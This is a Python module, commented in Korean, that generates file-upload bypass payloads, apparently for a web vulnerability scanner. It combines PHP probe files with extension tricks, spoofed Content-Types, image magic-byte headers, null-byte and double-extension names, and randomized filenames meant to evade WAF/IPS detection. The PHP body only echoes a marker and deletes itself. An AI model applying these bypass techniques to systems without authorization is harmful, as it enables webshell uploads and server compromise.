import uuid
import random
from dataclasses import dataclass

@dataclass(slots=True, frozen=True)
class FilePayload:
    filename: str
    content: bytes
    content_type: str
    attack_type: str

def generate_payloads() -> list[FilePayload]:
    # 1. 기본 웹쉘
    base_webshell = b"<?php echo 'WAF_UPLOAD_VULN_DETECTED'; unlink(__FILE__); ?>"
    
    # 2. 매직 바이트(Magic Bytes)가 포함된 웹쉘
    # 파일 맨 앞에 GIF89a 시그니처를 넣어 진짜 이미지인 것처럼 서버의 검증 로직을 속임
    gif_webshell = b"GIF89a;\n" + base_webshell
    png_webshell = b"\x89PNG\r\n\x1a\n\0\0\0\rIHDR" + base_webshell

    payloads = []
    
    # [그룹 A] 확장자 우회 리스트 (대소문자 및 Windows OS 특성 반영)
    extensions = [
        "php", "php3", "php4", "php5", "phtml", "phar", "inc",
        "PhP", "pHP", "Php",           # 대소문자 우회 검사
        "php ", "php.", "php/."        # Windows 환경 특수문자 트릭 (저장 시 뒤의 문자 잘림)
    ]

    # [그룹 B] Content-Type 스푸핑 리스트
    content_types = [
        "application/x-php",           # 정상적인 PHP 타입
        "image/jpeg",                  # 이미지 위장
        "image/gif",
        "text/plain"                   # 텍스트 위장
    ]

    # 자연스러운 기본 파일명 후보군 (프로필 사진, 영수증, 문서 등 위장)
    base_names = ["profile_pic", "avatar", "receipt_2026", "document_vfinal", "upload", "img"]

    def get_random_filename(ext: str, prefix: str = "") -> str:
        """
        IPS/WAF 정규식 탐지를 우회하기 위해 자연스러운 이름 + 랜덤 문자열로 파일명을 생성합니다.
        예: avatar_8f3a2b.php
        """
        if not prefix:
            prefix = random.choice(base_names)
        random_str = uuid.uuid4().hex[:6] # 6자리 랜덤 해시
        return f"{prefix}_{random_str}.{ext}"

    # 1. 크로스 콤비네이션 공격 (모든 확장자 x 모든 Content-Type 결합)
    for ext in extensions:
        for c_type in content_types:
            filename = get_random_filename(ext)
            payloads.append(
                FilePayload(filename, base_webshell, c_type, f"Bypass_{ext}_CT_{c_type.split('/')[1]}")
            )

    # 2. 매직 바이트 (파일 내용 검사 우회) 공격
    # 파일 확장자도 속이고, Content-Type도 속이고, 실제 파일 내용물(헤더)까지 속이는 3단 콤보
    payloads.append(FilePayload(get_random_filename("php", "avatar"), gif_webshell, "image/gif", "Magic_Byte_GIF"))
    payloads.append(FilePayload(get_random_filename("php", "receipt"), png_webshell, "image/png", "Magic_Byte_PNG"))
    
    # 매직 바이트 + 확장자 우회 콤보
    for ext in ["php5", "phtml", "PhP"]:
        filename = get_random_filename(ext, "image")
        payloads.append(FilePayload(filename, gif_webshell, "image/gif", f"Magic_Byte_GIF_{ext}"))

    # 3. 기타 클래식 기법
    payloads.append(FilePayload(get_random_filename("php%00.jpg", "upload"), base_webshell, "image/jpeg", "Null_Byte_Injection"))
    payloads.append(FilePayload(get_random_filename("php.jpg", "document"), base_webshell, "image/jpeg", "Double_Extension"))
    
    return payloads


def get_file_upload_payloads() -> list[FilePayload]:
    """
    Backward-compatible entrypoint used by FileUploadModule.
    """
    return generate_payloads()